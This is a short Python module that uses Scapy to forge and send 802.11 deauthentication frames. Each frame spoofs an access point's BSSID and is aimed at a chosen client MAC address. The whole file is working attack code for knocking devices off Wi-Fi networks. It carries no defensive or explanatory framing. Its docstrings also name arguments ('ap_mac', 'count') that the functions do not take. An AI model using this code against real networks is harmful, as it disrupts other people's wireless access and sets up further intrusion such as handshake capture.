"""This module contains functions to create 802.11 deauthentification packets."""
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Packet
from scapy.sendrecv import sendp


def create_deauth_packet(target_mac: str, ap_bssid: str) -> Packet:
    """Create 802.11 deauthentification packet.

    Args:
        target_mac (str): MAC address of the target
        ap_mac (str): BSSID of the spoofed access point
    Returns:
        Packet: 802.11 deauthentification packet"""
    return (
        RadioTap()
        / Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid)
        / Dot11Deauth(reason=7)
    )


def send_deauth_packet(pkt: Packet, iface: str) -> None:
    """Send 802.11 deauthentification packet.

    Args:
        pkt (Packet): 802.11 deauthentification packet
        count (int): Number of packets to send
    Returns:
        None"""
    return sendp(pkt, iface=iface, verbose=False)
